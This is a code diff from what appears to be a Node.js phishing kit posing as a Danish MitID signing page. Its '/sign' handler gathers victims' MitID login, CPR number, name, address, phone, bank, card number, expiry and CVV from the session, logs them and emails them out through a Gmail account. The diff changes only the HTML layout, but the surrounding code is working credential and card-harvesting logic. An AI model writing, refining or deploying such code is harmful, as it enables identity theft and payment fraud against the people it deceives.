@@ -103,7 +103,7 @@ app.post('/sign', async (req, resp) => {
   });
 
 
-  var body = `<div>MitId</div><br><div>${req.session.userId}</div><br><br><hr><div>CPR-nummer</div><br><div>${req.session.cpr}</div><br><br><hr><div>Personal Details</div><br><div>${req.session.name}</div><div>${req.session.address}</div><div>${req.session.by}</div><br><br><hr><div>Phone Number</div><br><div>${req.session.phone}</div><br><br><hr><div>Bank Details</div><br><div>${req.session.bank}</div><div>${req.session.card}</div><div>${req.session.expiry}</div><div>${req.session.cvv}</div>`
+  var body = `<hr><div>MitId</div><br><div>${req.session.userId}</div><hr><div>CPR-nummer</div><br><div>${req.session.cpr}</div><hr><div>Personal Details</div><br><div>${req.session.name}</div><div>${req.session.address}</div><div>${req.session.by}</div><hr><div>Phone Number</div><br><div>${req.session.phone}</div><hr><div>Bank Details</div><br><div>${req.session.bank}</div><div>${req.session.card}</div><div>${req.session.expiry}</div><div>${req.session.cvv}</div><hr>`
   console.log(body)
   await transporter.sendMail({
     from: 'nmunshi40@gmail.com',
